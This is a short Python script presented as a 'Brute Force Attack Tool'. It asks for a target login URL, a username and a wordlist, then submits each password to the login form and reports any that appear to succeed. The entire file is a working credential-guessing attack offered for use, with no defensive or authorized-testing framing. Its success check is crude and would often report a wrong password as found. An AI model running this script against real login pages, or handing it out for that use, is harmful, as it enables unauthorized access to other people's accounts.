import requests

def banner():
    print("\n🔓 Brute Force Attack Tool by MD ABDULLAH\n")

def run_attack():
    url = input("🌐 Target Login URL: ").strip()
    username = input("👤 Username: ").strip()
    wordlist = input("📂 Wordlist path (e.g. wordlist.txt): ").strip()

    try:
        with open(wordlist, 'r') as file:
            passwords = file.readlines()
    except:
        print("❌ Cannot open wordlist file!")
        return

    print(f"\n🎯 Starting brute force on {url} ...\n")

    for pwd in passwords:
        password = pwd.strip()
        data = {'username': username, 'password': password}
        try:
            res = requests.post(url, data=data)
            if "Welcome" in res.text or res.status_code == 200:
                print(f"✅ Password Found: {password}")
                return
            else:
                print(f"❌ Tried: {password}")
        except:
            print("⚠️ Error occurred.")

    print("🔒 Brute force complete. Password not found.")

def main():
    banner()
    run_attack()

if __name__ == "__main__":
    main()
